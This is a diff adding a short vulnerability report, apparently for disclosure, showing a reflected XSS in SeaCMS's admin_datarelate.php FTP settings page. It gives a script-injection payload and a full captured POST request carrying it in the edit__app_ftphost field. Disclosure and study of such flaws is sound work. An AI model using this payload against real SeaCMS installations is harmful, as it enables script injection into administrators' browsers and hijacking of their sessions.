@@ -1,0 +1,41 @@
+12.9 admin_datarelate has a reflected xss vulnerability
+
+Visit our admin_datarelate, get the incoming parameter action=ftppic
+
+![image-20240820210848868](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240820210848868.png)
+
+```
+Come to this interface
+Enter at any location
+```
+
+`"><script>alert('XSS')</script>`
+
+then click Save
+
+```java
+POST /p8qca/admin_datarelate.php?action=saveftppic HTTP/1.1
+Host: seacms:8181
+Content-Length: 283
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://seacms:8181
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://seacms:8181/p8qca/admin_datarelate.php?action=ftppic
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=5dl35hp50uj606p52se8kg91a2; t00ls=e54285de394c4207cd521213cebab040; t00ls_s=YTozOntzOjQ6InVzZXIiO3M6MjY6InBocCB8IHBocD8gfCBwaHRtbCB8IHNodG1sIjtzOjM6ImFsbCI7aTowO3M6MzoiaHRhIjtpOjE7fQ%3D%3D
+Connection: keep-alive
+
+edit__app_ftp=1&edit__app_ftphost=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&edit__app_ftpuser=1&edit__app_ftppass=2&edit__app_ftpport=21&edit__app_ftpdir=%2F&edit__app_ftpurl=http%3A%2F%2Ftest.seacms.net&edit__app_ftpdel=0&edit__app_updatepic=0&Submit=%E6%8F%90+%E4%BA%A4
+```
+
+After the jump
+
+![image-20240820211518706](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240820211518706.png)
+
+
+
+### 
